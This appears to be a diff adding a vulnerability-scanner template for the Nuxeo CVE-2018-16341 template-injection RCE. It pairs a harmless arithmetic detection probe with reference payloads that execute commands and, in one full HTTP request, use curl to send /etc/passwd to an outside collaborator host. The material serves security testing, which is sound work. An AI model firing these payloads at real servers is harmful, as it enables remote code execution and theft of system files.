@@ -1,0 +1,34 @@
+id: nuxeo-ssti-rce
+info:
+  name: Nuxeo SSTI RCE - CVE-2018-16341
+  risk: Critical
+
+params:
+  - root: "{{.BaseURL}}"
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/nuxeo/login.jsp/pwn${1199128+7}.xhtml
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "facelet") && StringSearch("response", "1199135")
+
+references:
+  - link: https://github.com/mpgn/CVE-2018-16341
+  - link2: https://blog.riskivy.com/nuxeo-rce-analysis-cve-2018-16341/
+  - rce: |
+      http://example.com/nuxeo/login.jsp/pwn${expressions.getClass().forName('java.io.BufferedReader').getDeclaredMethod('readLine').invoke(''.getClass().forName('java.io.BufferedReader').getConstructor(''.getClass().forName('java.io.Reader')).newInstance(''.getClass().forName('java.io.InputStreamReader').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Process').getDeclaredMethod('getInputStream').invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(null),'pwd')))))}.xhtml
+  - rce2: |
+      GET /nuxeo/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl%20--data-binary%20@/etc/passwd%20xkl8uq9g5c7qnblke1tg153ppgv8jx.burpcollaborator.net",null).waitFor()}.xhtml HTTP/1.1
+      Host: target
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US,en;q=0.5
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+
